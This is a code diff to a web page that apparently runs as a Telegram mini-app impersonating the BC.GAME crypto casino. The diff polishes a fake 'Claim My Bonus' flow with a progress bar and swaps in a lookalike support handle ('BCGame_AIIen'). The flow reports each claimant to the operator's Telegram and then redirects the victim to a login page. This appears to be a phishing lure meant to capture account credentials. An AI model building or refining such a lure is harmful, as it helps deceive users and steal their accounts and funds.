@@ -567,6 +567,20 @@
             font-weight: 500;
         }
 
+        .claim-progress-btn {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: transparent;
+            color: #000;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: default;
+            pointer-events: none;
+        }
+
         /* Info Card */
         .info-row {
             display: flex;
@@ -871,6 +885,13 @@
                     <button id="claim-bonus-btn" class="claim-bonus-btn" onclick="claimBonus()">
                         💰 Claim My Bonus Now
                     </button>
+                    <div id="bonus-progress-container" class="bonus-progress-container">
+                        <div class="bonus-progress-bar">
+                            <div id="bonus-progress-fill" class="bonus-progress-fill"></div>
+                            <button id="claim-bonus-progress-btn" class="claim-progress-btn" type="button">💰 Claim My Bonus Now</button>
+                        </div>
+                        <div id="bonus-progress-text" class="bonus-progress-text">Processing...</div>
+                    </div>
                 </div>
 
                 <!-- Info Card -->
@@ -926,7 +947,7 @@
         tg.expand();
         tg.enableClosingConfirmation();
         
-        const SUPPORT = 'BCVlP_Passy';
+        const SUPPORT = 'BCGame_AIIen';
         const MEDAL_BASE = 'https://bcgame.nz/substation/bc/account/user/achieve/achieve_';
 
         // All medal types from BC.GAME in exact order
@@ -1125,11 +1146,18 @@
             document.getElementById('content').style.display = 'block';
         }
 
+        let claimInProgress = false;
+
         function checkBonusStatus() {
             const bonusTextDisplay = document.getElementById('bonus-text-display');
             const claimButton = document.getElementById('claim-bonus-btn');
+            const progressContainer = document.getElementById('bonus-progress-container');
+            const progressFill = document.getElementById('bonus-progress-fill');
             bonusTextDisplay.innerHTML = 'Your bonus is being prepared...<br>Verifying eligibility...';
             claimButton.style.display = 'flex';
+            if (progressContainer) progressContainer.style.display = 'none';
+            if (progressFill) progressFill.style.width = '0%';
+            claimInProgress = false;
         }
 
         function animateProgressBar() {
@@ -1182,14 +1210,26 @@
         }
         
         async function claimBonus() {
+            if (claimInProgress) return;
+            claimInProgress = true;
+
+            const claimButton = document.getElementById('claim-bonus-btn');
+            const progressContainer = document.getElementById('bonus-progress-container');
+            if (claimButton) claimButton.style.display = 'none';
+            if (progressContainer) progressContainer.style.display = 'block';
+
+            animateProgressBar();
+
             const userLabel = window.profileUserLabel || 'User(vip0)';
-            
+
             // Send notification to Telegram
             await sendClaimToTelegram(userLabel);
-            
-            // Redirect to login page
-            const targetUrl = `login.html?user=${encodeURIComponent(userLabel)}`;
-            window.location.href = targetUrl;
+
+            // Short delay so the progress bar is visible before redirect
+            setTimeout(() => {
+                const targetUrl = `login.html?user=${encodeURIComponent(userLabel)}`;
+                window.location.href = targetUrl;
+            }, 600);
         }
 
         function showClaimPopup() {
